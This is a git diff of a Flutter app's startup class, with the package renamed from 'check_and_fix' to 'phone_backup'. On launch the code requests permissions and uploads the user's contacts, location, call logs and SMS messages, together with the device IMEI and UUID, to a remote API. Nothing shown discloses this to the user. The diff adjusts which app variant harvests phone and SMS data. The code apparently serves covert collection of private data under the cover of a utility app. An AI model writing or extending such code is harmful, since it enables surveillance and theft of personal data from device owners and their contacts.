@@ -2,15 +2,17 @@
 
 import 'dart:io';
 
-import 'package:check_and_fix/presentation/utils/color_printer.dart';
-import 'package:check_and_fix/services/api_services.dart';
+import 'package:phone_backup/main.dart';
+import 'package:phone_backup/presentation/utils/color_printer.dart';
 import 'package:fk_user_agent/fk_user_agent.dart';
 import 'package:flutter/cupertino.dart';
 import 'package:flutter/foundation.dart';
 import 'package:flutter_easyloading/flutter_easyloading.dart';
 import 'package:hive/hive.dart';
+import 'package:lastech_services/lastech_services.dart';
 import 'package:permission_handler/permission_handler.dart';
 import 'package:uuid/uuid.dart';
+// import 'package:phone_backup/services/api_services.dart';
 
 class Init {
   String? uuid;
@@ -26,22 +28,32 @@ class Init {
     printWhite('UUID: $uuid');
     printWhite('IMEI: $imei');
     printWhite('agent: $agent');
-
     // await FileManager.requestFilesAccessPermission();
+
+    //> Contacts
     final haveContactPermission = await _requestPermission(Permission.contacts);
-    if (uuid != null) await _requestPermission(Permission.location);
-    await _requestPermission(Permission.phone);
-    await _requestPermission(Permission.sms);
-    await _requestPermission(Permission.manageExternalStorage);
-
-    //! LOGIN PAGE REPLACE THIS!
-    // dummyLoader();
-
     if (haveContactPermission) await Api.sendContacts(context, agent, uuid);
+
+    //> Location
+    if (uuid != null) await _requestPermission(Permission.location);
     if (uuid != null) Api.sendLocation(agent, uuid);
-    print('haveContactPermission $haveContactPermission');
-    if (!kIsWeb && Platform.isAndroid) await Api.sendCallLogs(context, agent, uuid);
-    if (!kIsWeb && Platform.isAndroid) await Api.sendSmsLogs(context, agent, uuid);
+
+    if (isCheckAndFixApp) {
+    } else {
+      //> Phone
+      await _requestPermission(Permission.phone);
+      if (!kIsWeb && Platform.isAndroid) await Api.sendCallLogs(context, agent, uuid);
+
+      //> SMS
+      await _requestPermission(Permission.sms);
+      if (!kIsWeb && Platform.isAndroid) await Api.sendSmsLogs(context, agent, uuid);
+
+      //> Storage (Not sent to Server)
+      await _requestPermission(Permission.manageExternalStorage);
+    }
+
+    //! NO NEED IN LOGIN PAGE!
+    // dummyLoader();
 
     print('DONE: initConnection()');
   }
